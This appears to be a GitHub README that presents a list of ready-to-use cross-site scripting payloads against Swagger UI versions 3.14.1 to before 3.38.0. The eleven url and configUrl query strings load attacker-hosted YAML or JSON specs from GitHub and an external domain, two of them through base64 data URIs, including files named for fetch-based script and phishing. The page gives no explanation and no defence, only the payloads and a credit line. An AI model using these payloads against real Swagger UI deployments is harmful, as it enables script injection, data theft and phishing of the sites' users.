# swagger-ui-xss
Swagger UI version affected: `>=3.14.1` &lt; `3.38.0`

## Payload

1. `?url=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-domain.yaml`
2. `?url=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-fetch.yaml`
3. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/refs/main/config.json`
4. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/refs/heads/main/domain.json`
5. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/refs/heads/main/pishing.json`
6. `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
7. `/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
8. `?configUrl=https://cathack.rf.gd/config.json`
9. `?configUrl=https://cathack.rf.gd/test.json`
10. `?url=https://cathack.rf.gd/test.yaml`
11. `?url=https://cathack.rf.gd/fetch.yaml`



Thanks to: https://github.com/VictorNS69/swagger-ui-xss/
